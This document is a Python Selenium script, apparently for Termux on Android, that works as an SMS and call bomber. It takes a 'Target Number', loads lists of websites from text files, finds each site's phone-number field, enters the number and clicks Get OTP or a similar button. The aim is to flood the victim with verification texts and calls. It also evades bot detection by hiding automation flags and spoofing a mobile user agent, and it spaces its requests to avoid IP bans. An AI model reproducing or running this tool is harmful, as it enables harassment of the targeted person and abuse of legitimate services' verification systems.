import time
import os
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- CONFIGURATION ---
SMS_FILE = "sms.txt"
CALL_FILE = "call.txt"
success, failed = 0, 0

def load_links(filename):
    if not os.path.exists(filename): return []
    with open(filename, "r") as f:
        return [line.strip() for line in f if line.strip() and line.startswith("http")]

def create_driver():
    options = Options()
    options.add_argument("--headless") 
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--disable-gpu")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument("user-agent=Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
    
    # Termux Chromedriver Path
    service = Service('/data/data/com.termux/files/usr/bin/chromedriver')
    try:
        driver = webdriver.Chrome(service=service, options=options)
        driver.set_page_load_timeout(30)
        return driver
    except Exception as e:
        print(f"\n[!] Driver Start Error: {e}")
        return None

def find_and_click_login(driver):
    """If mobile box is not visible, look for Login buttons first"""
    login_keywords = ["login", "sign in", "log in", "otp", "register", "account", "signin"]
    tags = ["button", "a", "span", "div", "li"]
    
    for tag in tags:
        elements = driver.find_elements(By.TAG_NAME, tag)
        for el in elements:
            try:
                text = el.text.lower()
                if any(k in text for k in login_keywords) and el.is_displayed():
                    driver.execute_script("arguments[0].click();", el)
                    time.sleep(3)
                    return True
            except: continue
    return False

def find_mobile_input(driver):
    """Find the mobile number input box smartly"""
    keywords = ["tel", "mobile", "phone", "number", "digit", "user"]
    inputs = driver.find_elements(By.TAG_NAME, "input")
    for i in inputs:
        try:
            attr = str(i.get_attribute("outerHTML")).lower()
            if any(k in attr for k in keywords) and i.is_displayed():
                return i
        except: continue
    return None

def find_submit_button(driver):
    """Find the Get OTP / Continue button"""
    keywords = ["get otp", "continue", "next", "submit", "login", "send", "verify", "proceed"]
    
    # Try buttons first
    btns = driver.find_elements(By.TAG_NAME, "button")
    for b in btns:
        try:
            text = b.text.lower()
            if any(k in text for k in keywords) and b.is_displayed():
                return b
        except: continue
        
    # Try input submits
    submits = driver.find_elements(By.XPATH, "//input[@type='submit' or @type='button']")
    for s in submits:
        try:
            val = s.get_attribute("value").lower()
            if any(k in val for k in keywords):
                return s
        except: continue
    return None

def attempt(site, mobile):
    global success, failed
    driver = create_driver()
    if not driver: return

    try:
        driver.get(site)
        time.sleep(4) # Initial wait
        
        # Step 1: Detect Mobile Box
        m_box = find_mobile_input(driver)
        
        # Step 2: If no box, try clicking Login first
        if not m_box:
            find_and_click_login(driver)
            m_box = find_mobile_input(driver)

        if m_box:
            # Step 3: Enter Number
            driver.execute_script("arguments[0].scrollIntoView();", m_box)
            m_box.clear()
            m_box.send_keys(mobile)
            time.sleep(1)
            
            # Step 4: Click Submit
            s_btn = find_submit_button(driver)
            if s_btn:
                driver.execute_script("arguments[0].click();", s_btn)
                time.sleep(4) # Wait for OTP trigger
                print(f"[+] SUCCESS: {site}")
                success += 1
                return
        
        print(f"[-] FAILED: {site}")
        failed += 1
    except Exception:
        print(f"[!] TIMEOUT/ERROR: {site}")
        failed += 1
    finally:
        driver.quit()

def main():
    try:
        os.system("clear")
        print("========================================")
        print("    🚀 ADVANCE WEB AUTOMATION v4.0      ")
        print("========================================\n")
        
        mobile = input("Enter Target Number: ")
        sms_list = load_links(SMS_FILE)
        call_list = load_links(CALL_FILE)
        
        print(f"\nLoaded: {len(sms_list)} SMS | {len(call_list)} Call links")
        print("\nModes: 1.SMS | 2.Call | 3.Mixed")
        choice = input("Select Mode: ")
        
        targets = []
        if choice == "1": targets = sms_list
        elif choice == "2": targets = call_list
        else: targets = sms_list + call_list
        
        if not targets: 
            print("Files are empty! Add links first.")
            return

        print(f"\n[*] Starting on {len(targets)} sites. CTRL+C to stop.\n")
        
        for site in targets:
            attempt(site, mobile)
            time.sleep(1) # Gap to prevent IP ban

    except KeyboardInterrupt:
        print("\n\n[!] Stopped by User.")
    finally:
        print(f"\n--- FINAL REPORT ---")
        print(f"SUCCESS: {success} | FAILED: {failed}")
        print("========================================")

if __name__ == "__main__":
    main()